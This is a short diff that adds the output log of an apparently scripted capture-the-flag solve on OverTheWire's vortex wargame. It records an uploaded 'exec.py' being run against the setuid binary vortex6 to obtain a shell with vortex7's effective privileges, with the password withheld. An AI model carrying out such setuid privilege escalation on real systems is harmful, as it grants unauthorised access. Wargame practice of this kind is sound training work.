@@ -1,0 +1,6 @@
+[+] Connecting to vortex.labs.overthewire.org on port 22: OK
+[*] Working directory: '/tmp/tmp.ytkJ86U95R'
+[*] Uploading 'exec.py' to '/tmp/tmp.ytkJ86U95R/exec.py'
+[+] Opening new channel: 'python exec.py /vortex/vortex6 /bin/sh': OK
+[+] id: uid=5006(vortex6) gid=5006(vortex6) euid=5007(vortex7) groups=5007(vortex7),5006(vortex6)
+[+] password: <removed>
